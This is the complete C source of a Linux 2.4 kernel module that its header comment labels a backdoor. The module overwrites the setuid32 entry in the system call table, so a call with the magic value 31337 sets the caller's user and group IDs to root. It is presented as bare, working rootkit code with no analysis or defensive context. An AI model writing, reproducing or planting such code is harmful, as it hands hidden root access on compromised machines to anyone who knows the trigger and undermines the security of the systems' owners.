/* Module backdoor for Linux 2.4.x */
#define __KERNEL__
#define MODULE
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <sys/syscall.h>
#include <linux/sched.h>
#include <linux/types.h>

extern void *sys_call_table[]; 
int (*orig_setuid)(uid_t);

int change_setuid(uid_t uid)
{
  if (uid == 31337)
  {
      current->uid = 0;
      current->euid = 0;
      current->gid = 0;
      current->egid = 0;
      return 0;
  }
  return (*orig_setuid)(uid);
}

int init_module(void)
{
  orig_setuid = sys_call_table[__NR_setuid32];
  sys_call_table[__NR_setuid32] = change_setuid;
  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_setuid32] = orig_setuid; 
}
